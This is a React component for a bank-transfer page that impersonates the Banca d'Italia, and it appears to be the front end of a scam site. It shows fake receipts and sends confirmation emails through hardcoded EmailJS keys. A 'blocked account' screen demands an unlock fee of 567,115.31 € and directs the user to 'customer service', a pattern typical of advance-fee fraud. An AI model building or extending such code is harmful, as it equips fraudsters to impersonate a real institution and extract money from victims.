// components/VirementPage.jsx (BonificoPage)
import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { ArrowLeft, Send, AlertCircle, Check, Download, Printer, X } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import DashboardHeader from './DashboardHeader';
import BottomNavigation from './BottomNavigation';
import UserService from '../services/UserService';
import emailjs from '@emailjs/browser';

const BonificoPage = () => {
  const { user, updateUser } = useAuth();
  const navigate = useNavigate();
  const [step, setStep] = useState('form');
  const [transactionData, setTransactionData] = useState(null);
  
  const [formData, setFormData] = useState({
    beneficiario: '',
    iban: '',
    bic: '',
    email: '',
    importo: '',
    causale: '',
    tipoConto: 'LIQUIDITÀ'
  });
  
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const EMAILJS_SERVICE_ID = 'service_zlw3u1o';
  const EMAILJS_TEMPLATE_ID = 'template_b0bnvef';
  const EMAILJS_PUBLIC_KEY = '97pwynnX_1TDC0o0O';

  // ✅ PROTECTION : Rediriger si pas d'utilisateur
  if (!user) {
    navigate('/login');
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-gray-600">Caricamento...</p>
        </div>
      </div>
    );
  }

  // ✅ NOUVELLE PROTECTION : Bloquer si compte bloqué
  useEffect(() => {
    if (user?.isBlocked) {
      // Rediriger vers le dashboard avec un message
      navigate('/dashboard');
    }
  }, [user, navigate]);

  // ✅ FORMATER LES FRAIS DE DÉBLOCAGE EN EUROS
  const formatUnlockFee = () => {
    const fee = user?.unlockFee || 567115.31;
    return fee.toLocaleString('it-IT', { 
      minimumFractionDigits: 2,
      maximumFractionDigits: 2 
    });
  };

  // ✅ Si le compte est bloqué, afficher un message d'erreur
  if (user?.isBlocked) {
    return (
      <div className="min-h-screen bg-gray-50">
        <DashboardHeader />
        
        <div className="p-4 max-w-2xl mx-auto">
          <button 
            onClick={() => navigate('/dashboard')} 
            className="flex items-center text-blue-900 mb-6 hover:text-blue-700 transition"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="font-medium">Torna alla dashboard</span>
          </button>

          <div className="bg-white rounded-2xl shadow-lg p-8">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <X className="w-10 h-10 text-red-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-3">Account Bloccato</h2>
              <p className="text-gray-600 mb-6">
                Il tuo account è attualmente bloccato. I bonifici non sono disponibili.
              </p>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-5 mb-6">
              <p className="text-sm text-yellow-800 mb-2">
                <strong>Spese di sblocco:</strong> {formatUnlockFee()} €
              </p>
              <p className="text-xs text-yellow-700">
                Per sbloccare il tuo account e ripristinare tutte le funzionalità, 
                contatta il servizio clienti.
              </p>
            </div>

            <div className="space-y-3">
              <button
                onClick={() => navigate('/aiuto')}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-semibold transition"
              >
                Contatta il Servizio Clienti
              </button>
              
              <button
                onClick={() => navigate('/dashboard')}
                className="w-full bg-gray-200 hover:bg-gray-300 text-gray-700 py-3 rounded-lg font-semibold transition"
              >
                Torna alla Dashboard
              </button>
            </div>
          </div>
        </div>

        <BottomNavigation />
      </div>
    );
  }

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.beneficiario.trim()) {
      newErrors.beneficiario = 'Il nome del beneficiario è obbligatorio';
    } else if (formData.beneficiario.length < 3) {
      newErrors.beneficiario = 'Il nome deve contenere almeno 3 caratteri';
    }

    if (!formData.iban.trim()) {
      newErrors.iban = 'L\'IBAN è obbligatorio';
    } else if (formData.iban.replace(/\s/g, '').length < 15) {
      newErrors.iban = 'IBAN non valido (minimo 15 caratteri)';
    }

    if (!formData.bic.trim()) {
      newErrors.bic = 'Il codice BIC è obbligatorio';
    } else if (formData.bic.length < 8 || formData.bic.length > 11) {
      newErrors.bic = 'BIC non valido (8-11 caratteri)';
    }

    if (!formData.email.trim()) {
      newErrors.email = 'L\'email è obbligatoria';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Formato email non valido';
    }

    if (!formData.importo) {
      newErrors.importo = 'L\'importo è obbligatorio';
    } else if (parseFloat(formData.importo) <= 0) {
      newErrors.importo = 'L\'importo deve essere maggiore di 0';
    } else {
      const account = user.accounts?.find(acc => acc.type === formData.tipoConto);
      if (account && parseFloat(formData.importo) > account.balance) {
        newErrors.importo = `Saldo insufficiente (disponibile: ${account.balance.toLocaleString('it-IT')} ${account.currency})`;
      }
    }

    if (!formData.causale.trim()) {
      newErrors.causale = 'La causale è obbligatoria';
    } else if (formData.causale.length < 3) {
      newErrors.causale = 'La causale deve contenere almeno 3 caratteri';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const sendConfirmationEmail = async (transaction) => {
    try {
      const templateParams = {
        beneficiaire_nom: formData.beneficiario,
        beneficiaire_email: formData.email,
        emetteur_nom: user.name,
        montant: `${parseFloat(formData.importo).toLocaleString('it-IT', {minimumFractionDigits: 2})} €`,
        reference: transaction.reference,
        date: new Date(transaction.date).toLocaleDateString('it-IT'),
        heure: transaction.heure,
        motif: formData.causale,
        iban: formData.iban,
        bic: formData.bic,
        frais: `${transaction.frais.toLocaleString('it-IT', {minimumFractionDigits: 2})} €`,
        total: `${(parseFloat(formData.importo) + transaction.frais).toLocaleString('it-IT', {minimumFractionDigits: 2})} €`
      };

      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        templateParams,
        EMAILJS_PUBLIC_KEY
      );

      console.log('✅ Email inviata con successo');
    } catch (error) {
      console.error('❌ Errore durante l\'invio dell\'email:', error);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setLoading(true);

    try {
      const transaction = await UserService.createTransfer(user.id, {
        accountType: formData.tipoConto,
        beneficiary: formData.beneficiario,
        beneficiario: formData.beneficiario,
        iban: formData.iban,
        bic: formData.bic,
        email: formData.email,
        amount: parseFloat(formData.importo),
        causale: formData.causale,
        reference: formData.causale
      });

      await sendConfirmationEmail(transaction);

      const updatedUser = await UserService.getUserById(user.id);
      updateUser(updatedUser);

      setTransactionData(transaction);
      setStep('success');
      setLoading(false);

      setTimeout(() => {
        setStep('receipt');
      }, 2000);
    } catch (error) {
      setErrors({ submit: error.message || 'Errore durante il bonifico' });
      setLoading(false);
    }
  };

  const downloadPDF = () => {
    const receiptContent = `
╔══════════════════════════════════════════════════════════╗
║          RICEVUTA BONIFICO - BANCA D'ITALIA         ║
╚══════════════════════════════════════════════════════════╝

Data: ${new Date(transactionData.date).toLocaleDateString('it-IT')}
Ora: ${transactionData.heure}
Riferimento: ${transactionData.reference}

─────────────────────────────────────────────────────────

INFORMAZIONI MITTENTE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nome: ${user.name}
Conto: ${formData.tipoConto}
Numero cliente: ${user.clientNumber}

INFORMAZIONI BENEFICIARIO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nome: ${formData.beneficiario}
IBAN: ${formData.iban}
BIC: ${formData.bic}
Email: ${formData.email}

DETTAGLI BONIFICO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Importo: ${parseFloat(formData.importo).toLocaleString('it-IT', {minimumFractionDigits: 2})} €
Commissioni: ${transactionData.frais.toLocaleString('it-IT', {minimumFractionDigits: 2})} €
Totale addebitato: ${(parseFloat(formData.importo) + transactionData.frais).toLocaleString('it-IT', {minimumFractionDigits: 2})} €

Causale: ${formData.causale}
Stato: ${transactionData.statut}

─────────────────────────────────────────────────────────

BANCA D'ITALIA - Tutti i diritti riservati
Servizio Clienti: +39 06 47921
    `.trim();

    const blob = new Blob([receiptContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `ricevuta_bonifico_${transactionData.reference}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const printReceipt = () => {
    window.print();
  };

  if (step === 'success') {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-6">
          <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
            <Check className="text-white" size={50} />
          </div>
          <h2 className="text-3xl font-bold text-gray-800 mb-2">Bonifico effettuato!</h2>
          <p className="text-gray-600 text-lg">Importo: {formData.importo} €</p>
          <p className="text-gray-500 mt-2">Beneficiario: {formData.beneficiario}</p>
          <p className="text-sm text-gray-400 mt-4">Generazione ricevuta...</p>
          <p className="text-xs text-green-600 mt-2">✉️ Email di conferma inviata</p>
        </div>
      </div>
    );
  }

  if (step === 'receipt' && transactionData) {
    return (
      <div className="min-h-screen bg-gray-50 pb-20">
        <DashboardHeader/>
        
        <div className="p-4 max-w-3xl mx-auto">
          <button 
            onClick={() => navigate('/dashboard')} 
            className="flex items-center text-blue-900 mb-6 hover:text-blue-700 transition print:hidden"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="font-medium">Torna alla dashboard</span>
          </button>

          <div className="bg-white rounded-lg shadow-lg p-8 mb-6">
            <div className="text-center mb-8 pb-6 border-b-2 border-blue-900">
              <h1 className="text-3xl font-bold text-blue-900 mb-2">BANCA D'ITALIA</h1>
              <p className="text-gray-600">Ricevuta Bonifico</p>
            </div>

            <div className="bg-green-50 border-2 border-green-500 rounded-lg p-4 mb-6 flex items-center justify-center">
              <Check className="text-green-600 mr-3" size={24} />
              <span className="text-green-800 font-bold text-lg">Transazione completata</span>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-6 text-center">
              <p className="text-sm text-blue-800">
                ✉️ Una email di conferma è stata inviata a <strong>{formData.email}</strong>
              </p>
            </div>

            <div className="grid grid-cols-2 gap-4 mb-6 text-sm">
              <div>
                <p className="text-gray-500">Data</p>
                <p className="font-semibold">{new Date(transactionData.date).toLocaleDateString('it-IT')}</p>
              </div>
              <div>
                <p className="text-gray-500">Ora</p>
                <p className="font-semibold">{transactionData.heure}</p>
              </div>
              <div className="col-span-2">
                <p className="text-gray-500">Riferimento</p>
                <p className="font-semibold text-blue-900">{transactionData.reference}</p>
              </div>
            </div>

            <div className="mb-6 p-4 bg-gray-50 rounded-lg">
              <h3 className="font-bold text-gray-800 mb-3">Mittente</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Nome:</span>
                  <span className="font-semibold">{user.name}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Conto:</span>
                  <span className="font-semibold">{formData.tipoConto}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">N° Cliente:</span>
                  <span className="font-semibold">{user.clientNumber}</span>
                </div>
              </div>
            </div>

            <div className="mb-6 p-4 bg-blue-50 rounded-lg">
              <h3 className="font-bold text-gray-800 mb-3">Beneficiario</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Nome:</span>
                  <span className="font-semibold">{formData.beneficiario}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">IBAN:</span>
                  <span className="font-semibold">{formData.iban}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">BIC:</span>
                  <span className="font-semibold">{formData.bic}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Email:</span>
                  <span className="font-semibold">{formData.email}</span>
                </div>
              </div>
            </div>

            <div className="mb-6 p-4 bg-blue-50 rounded-lg">
              <h3 className="font-bold text-gray-800 mb-3">Dettagli finanziari</h3>
              <div className="space-y-2">
                <div className="flex justify-between text-lg">
                  <span className="text-gray-600">Importo:</span>
                  <span className="font-bold">{parseFloat(formData.importo).toLocaleString('it-IT', {minimumFractionDigits: 2})} €</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">Commissioni:</span>
                  <span className="font-semibold">{transactionData.frais.toLocaleString('it-IT', {minimumFractionDigits: 2})} €</span>
                </div>
                <div className="flex justify-between text-xl font-bold pt-2 border-t-2 border-gray-300">
                  <span className="text-gray-800">Totale addebitato:</span>
                  <span className="text-blue-900">{(parseFloat(formData.importo) + transactionData.frais).toLocaleString('it-IT', {minimumFractionDigits: 2})} €</span>
                </div>
              </div>
            </div>

            <div className="mb-6 p-4 bg-gray-50 rounded-lg">
              <h3 className="font-bold text-gray-800 mb-2">Causale</h3>
              <p className="text-gray-700">{formData.causale}</p>
            </div>

            <div className="text-center text-xs text-gray-500 pt-6 border-t border-gray-200">
              <p className="mt-3">BANCA D'ITALIA - Servizio Clienti</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 print:hidden">
            <button
              onClick={downloadPDF}
              className="bg-blue-900 text-white py-3 rounded-lg font-semibold hover:bg-blue-800 transition flex items-center justify-center"
            >
              <Download size={20} className="mr-2" />
              Scarica
            </button>
            
            <button
              onClick={printReceipt}
              className="bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition flex items-center justify-center"
            >
              <Printer size={20} className="mr-2" />
              Stampa
            </button>
            
            <button
              onClick={() => navigate('/dashboard')}
              className="bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition"
            >
              Termina
            </button>
          </div>
        </div>

        <BottomNavigation />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-20">
      <DashboardHeader />
      
      <div className="p-4 max-w-2xl mx-auto">
        <button 
          onClick={() => navigate('/dashboard')} 
          className="flex items-center text-blue-900 mb-6 hover:text-blue-700 transition"
        >
          <ArrowLeft size={20} className="mr-2" />
          <span className="font-medium">Indietro</span>
        </button>

        <div className="bg-white rounded-lg shadow-md p-6">
          <h1 className="text-2xl font-bold text-gray-800 mb-6">Nuovo Bonifico</h1>

          {errors.submit && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 flex items-start">
              <AlertCircle className="text-red-500 mr-3 mt-0.5" size={20} />
              <p className="text-red-700">{errors.submit}</p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Conto da addebitare *
              </label>
              <select
                name="tipoConto"
                value={formData.tipoConto}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              >
                {user.accounts?.map((account) => (
                  <option key={account.type} value={account.type}>
                    {account.type} - {account.balance.toLocaleString('it-IT', {minimumFractionDigits: 2})} {account.currency}
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Nome del beneficiario *
              </label>
              <input
                type="text"
                name="beneficiario"
                value={formData.beneficiario}
                onChange={handleChange}
                placeholder="Es: Mario Rossi"
                className={`w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.beneficiario ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.beneficiario && (
                <p className="text-red-500 text-sm mt-1">{errors.beneficiario}</p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                IBAN *
              </label>
              <input
                type="text"
                name="iban"
                value={formData.iban}
                onChange={handleChange}
                placeholder="IT60 XXXX XXXX XXXX XXXX XXXX XXX"
                className={`w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.iban ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.iban && (
                <p className="text-red-500 text-sm mt-1">{errors.iban}</p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Codice BIC / SWIFT *
              </label>
              <input
                type="text"
                name="bic"
                value={formData.bic}
                onChange={handleChange}
                placeholder="Es: BITAITRRENT"
                maxLength="11"
                className={`w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.bic ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.bic && (
                <p className="text-red-500 text-sm mt-1">{errors.bic}</p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Email del beneficiario *
              </label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="esempio@email.com"
                className={`w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.email ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.email && (
                <p className="text-red-500 text-sm mt-1">{errors.email}</p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Importo *
              </label>
              <div className="relative">
                <input
                  type="number"
                  name="importo"
                  value={formData.importo}
                  onChange={handleChange}
                  placeholder="0.00"
                  step="0.01"
                  min="0.01"
                  className={`w-full border rounded-lg px-4 py-3 pr-12 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.importo ? 'border-red-500' : 'border-gray-300'
                  }`}
                />
                <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-medium">€</span>
              </div>
              {errors.importo && (
                <p className="text-red-500 text-sm mt-1">{errors.importo}</p>
              )}
              {formData.importo && !errors.importo && (
                <p className="text-xs text-gray-500 mt-1">
                  Commissioni: {(parseFloat(formData.importo) * 0.005).toLocaleString('it-IT', {minimumFractionDigits: 2})} € (0.5%)
                </p>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Causale *
              </label>
              <textarea
                name="causale"
                value={formData.causale}
                onChange={handleChange}
                placeholder="Es: Affitto, Fattura..."
                rows="3"
                className={`w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none ${
                  errors.causale ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.causale && (
                <p className="text-red-500 text-sm mt-1">{errors.causale}</p>
              )}
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-900 text-white py-4 rounded-lg font-semibold text-lg hover:bg-blue-800 transition disabled:bg-gray-400 disabled:cursor-not-allowed flex items-center justify-center"
            >
              {loading ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                  Elaborazione...
                </>
              ) : (
                <>
                  <Send size={20} className="mr-2" />
                  Effettua bonifico
                </>
              )}
            </button>
          </form>
        </div>
      </div>

      <BottomNavigation />
    </div>
  );
};

export default BonificoPage;